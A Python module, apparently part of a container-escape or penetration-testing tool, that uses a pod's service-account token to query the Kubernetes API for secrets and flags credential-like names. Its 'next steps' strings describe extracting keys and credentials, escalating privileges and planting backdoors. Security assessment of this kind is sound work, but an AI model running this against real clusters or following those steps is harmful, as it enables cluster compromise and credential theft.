"""
Secrets Access Checker

Checks access to secrets cluster Kubernetes.
"""

import os
import json
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec


class SecretsAccessChecker:
    """Checks secrets access"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking access to secrets cluster Kubernetes."""
        try:
            # Checking for token presence
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if not os.path.exists(token_path):
                return EscapeAttemptResult(
                    method='secrets_access',
                    status='not_found',
                    message='Service account token not found.'
                )
                
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
            namespace = (await asyncio.to_thread(lambda: open("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "r").read())).strip()
                
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Checking access to secrets in current namespace
            curl_cmd = [
                'curl', '-s',
                f'https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/secrets',
                '--header', f'Authorization: Bearer {token}',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
            ]
            
            rc, out, _ = await run_exec(curl_cmd, timeout=5)
            
            if rc == 0 and "items" in out:
                try:
                    secrets_data = json.loads(out)
                    secrets_count = len(secrets_data.get("items", []))
                    
                    if secrets_count > 0:
                        # Trying to find interesting secrets
                        interesting_secrets = []
                        for secret in secrets_data.get("items", []):
                            name = secret.get("metadata", {}).get("name", "")
                            secret_type = secret.get("type", "")
                            
                            if any(keyword in name.lower() for keyword in [
                                "token", "key", "password", "cred", "secret", "cert", "ssh", "auth"
                            ]):
                                interesting_secrets.append(f"{name} ({secret_type})")
                        
                        demo_next = "After getting access to secrets, I can extract SA access tokens, SSH private keys, TLS certificates and database passwords. Using this data, can escalate privileges in cluster, authenticate in critical systems and install backdoors for persistent access. Especially valuable are Docker registry credentials, allowing to upload own images."
                        return EscapeAttemptResult(
                            method='secrets_access',
                            status='exploited',
                            message=f'detected access to {secrets_count} secrets in namespace {namespace}.',
                            artifact_content=f"Interesting secrets: {', '.join(interesting_secrets)}" if interesting_secrets else None,
                            demo_next_steps=demo_next
                        )
                except Exception:
                    pass
            
            # Checking access to secrets of all cluster
            curl_cmd = [
                'curl', '-s',
                f'https://{api_server}:{api_port}/api/v1/secrets',
                '--header', f'Authorization: Bearer {token}',
                '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
            ]
            
            rc, out, _ = await run_exec(curl_cmd, timeout=5)
            
            if rc == 0 and "items" in out:
                try:
                    secrets_data = json.loads(out)
                    secrets_count = len(secrets_data.get("items", []))
                    
                    demo_next = "After getting access to all cluster secrets, can extract administrator tokens, etcd encryption keys, cloud provider credentials. with this data can fully compromise cluster, create highly privileged pods, modify nodes and manage all resources. Possible to even create admin users on all nodes via system secrets."
                    return EscapeAttemptResult(
                        method='secrets_access',
                        status='exploited',
                        message=f'Critical Access: detected access to ALL {secrets_count} cluster secrets!',
                        demo_next_steps=demo_next
                    )
                except Exception:
                    pass
                    
            return EscapeAttemptResult(
                method='secrets_access',
                status='no_access',
                message='Access to cluster secrets missing or limited.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='secrets_access', status='error', message=str(e))

